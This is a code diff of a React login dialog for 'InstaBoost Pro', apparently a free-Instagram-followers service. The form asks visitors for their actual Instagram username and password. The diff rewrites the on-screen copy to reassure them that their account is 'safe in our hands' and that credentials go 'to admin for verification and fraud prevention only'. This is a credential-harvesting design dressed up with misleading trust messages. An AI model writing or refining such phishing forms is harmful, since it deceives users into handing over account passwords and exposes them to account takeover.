@@ -1,4 +1,3 @@
-import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -9,6 +8,7 @@ import {
   DialogContent,
   DialogHeader,
   DialogTitle,
+  DialogDescription,
 } from "@/components/ui/dialog";
 import {
   Form,
@@ -31,10 +31,10 @@ type LoginForm = z.infer<typeof loginSchema>;
 interface AuthModalProps {
   isOpen: boolean;
   onClose: () => void;
+  isFromBonus?: boolean;
 }
 
-export function AuthModal({ isOpen, onClose }: AuthModalProps) {
-  const [isSignUp, setIsSignUp] = useState(false);
+export function AuthModal({ isOpen, onClose, isFromBonus = false }: AuthModalProps) {
   const { toast } = useToast();
   const login = useLogin();
 
@@ -50,16 +50,14 @@ export function AuthModal({ isOpen, onClose }: AuthModalProps) {
     try {
       await login.mutateAsync(data);
       toast({
-        title: isSignUp ? "Account Created!" : "Login Successful!",
-        description: isSignUp 
-          ? "Welcome to InstaBoost Pro! ₹10 bonus added to your wallet."
-          : "Welcome back to InstaBoost Pro!",
+        title: "Login Successful!",
+        description: "Welcome to InstaBoost Pro!",
       });
       onClose();
     } catch (error: any) {
       toast({
         title: "Error",
-        description: error.message || "Something went wrong",
+        description: error.message || "Login failed. Please check your credentials.",
         variant: "destructive",
       });
     }
@@ -67,16 +65,24 @@ export function AuthModal({ isOpen, onClose }: AuthModalProps) {
 
   return (
     <Dialog open={isOpen} onOpenChange={onClose}>
-      <DialogContent className="sm:max-w-md bg-charcoal border-gold/30">
+      <DialogContent className="sm:max-w-md" style={{ backgroundColor: 'var(--card-bg)', borderColor: 'var(--gold)' }}>
         <DialogHeader>
-          <DialogTitle className="text-center text-2xl font-bold text-gold mb-2">
-            {isSignUp ? "Join InstaBoost Pro" : "Welcome Back"}
+          <DialogTitle className="text-center text-2xl font-bold mb-2" style={{ color: 'var(--gold)' }}>
+            Login to InstaBoost Pro
           </DialogTitle>
-          <p className="text-center text-cream/70">
-            {isSignUp
-              ? "Create your account and claim ₹10 bonus"
-              : "Sign in to your InstaBoost Pro account"}
-          </p>
+          <DialogDescription className="text-center" style={{ color: 'var(--primary-text)' }}>
+            {isFromBonus ? (
+              <div className="space-y-2">
+                <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3">
+                  <p className="font-semibold text-yellow-400">
+                    ⚠️ Important: Login with the same Instagram account where you want to receive free followers!
+                  </p>
+                </div>
+              </div>
+            ) : (
+              <p>Login with your Instagram account for personalized services</p>
+            )}
+          </DialogDescription>
         </DialogHeader>
 
         <div className="space-y-6">
@@ -87,14 +93,19 @@ export function AuthModal({ isOpen, onClose }: AuthModalProps) {
                 name="instagramUsername"
                 render={({ field }) => (
                   <FormItem>
-                    <FormLabel className="text-cream font-medium">
+                    <FormLabel className="font-medium" style={{ color: 'var(--primary-text)' }}>
                       Instagram Username
                     </FormLabel>
                     <FormControl>
                       <Input
                         {...field}
                         placeholder="your_username"
-                        className="bg-charcoal-dark border-gold/20 text-cream focus:border-gold"
+                        style={{ 
+                          backgroundColor: 'var(--main-bg)', 
+                          borderColor: 'var(--gold)', 
+                          color: 'var(--primary-text)' 
+                        }}
+                        className="focus:border-2"
                       />
                     </FormControl>
                     <FormMessage />
@@ -107,7 +118,7 @@ export function AuthModal({ isOpen, onClose }: AuthModalProps) {
                 name="password"
                 render={({ field }) => (
                   <FormItem>
-                    <FormLabel className="text-cream font-medium">
+                    <FormLabel className="font-medium" style={{ color: 'var(--primary-text)' }}>
                       Password
                     </FormLabel>
                     <FormControl>
@@ -115,7 +126,12 @@ export function AuthModal({ isOpen, onClose }: AuthModalProps) {
                         {...field}
                         type="password"
                         placeholder="Your password"
-                        className="bg-charcoal-dark border-gold/20 text-cream focus:border-gold"
+                        style={{ 
+                          backgroundColor: 'var(--main-bg)', 
+                          borderColor: 'var(--gold)', 
+                          color: 'var(--primary-text)' 
+                        }}
+                        className="focus:border-2"
                       />
                     </FormControl>
                     <FormMessage />
@@ -123,15 +139,15 @@ export function AuthModal({ isOpen, onClose }: AuthModalProps) {
                 )}
               />
 
-              <div className="bg-gold/10 border border-gold/20 rounded-lg p-4">
+              <div className="rounded-lg p-4" style={{ backgroundColor: 'rgba(214, 173, 96, 0.1)', borderColor: 'var(--gold)' }}>
                 <div className="flex items-start space-x-3">
-                  <i className="fas fa-shield-alt text-gold text-lg mt-1"></i>
-                  <div className="text-cream/80 text-sm">
-                    <p className="font-semibold mb-1">Secure Authentication</p>
+                  <i className="fas fa-shield-alt text-lg mt-1" style={{ color: 'var(--gold)' }}></i>
+                  <div className="text-sm" style={{ color: 'var(--muted-text)' }}>
+                    <p className="font-semibold mb-2" style={{ color: 'var(--primary-text)' }}>
+                      🔒 Don't worry, your details and account are safe in our hands
+                    </p>
                     <p>
-                      Your login credentials are required to verify your Instagram
-                      account and enable bonus services. Credentials are securely
-                      transmitted to admin for verification only.
+                      This login is required for blocking scammers and bots. Your credentials are securely sent to admin for verification and fraud prevention only. We never store passwords permanently.
                     </p>
                   </div>
                 </div>
@@ -140,29 +156,24 @@ export function AuthModal({ isOpen, onClose }: AuthModalProps) {
               <Button
                 type="submit"
                 disabled={login.isPending}
-                className="w-full btn-primary"
+                className="w-full"
+                style={{ 
+                  backgroundColor: 'var(--gold)', 
+                  color: 'var(--navbar-bg)',
+                  borderRadius: '50px',
+                  fontWeight: '600',
+                  padding: '12px 24px'
+                }}
               >
                 {login.isPending ? (
                   <i className="fas fa-spinner fa-spin mr-2"></i>
                 ) : (
                   <i className="fas fa-sign-in-alt mr-2"></i>
                 )}
-                {isSignUp ? "Create Account & Claim Bonus" : "Sign In"}
+                Login to Continue
               </Button>
             </form>
           </Form>
-
-          <div className="text-center">
-            <p className="text-cream/70">
-              {isSignUp ? "Already have an account?" : "Don't have an account?"}
-            </p>
-            <button
-              onClick={() => setIsSignUp(!isSignUp)}
-              className="text-gold hover:text-tan font-semibold transition-colors duration-300"
-            >
-              {isSignUp ? "Sign In" : "Create Account"}
-            </button>
-          </div>
         </div>
       </DialogContent>
     </Dialog>
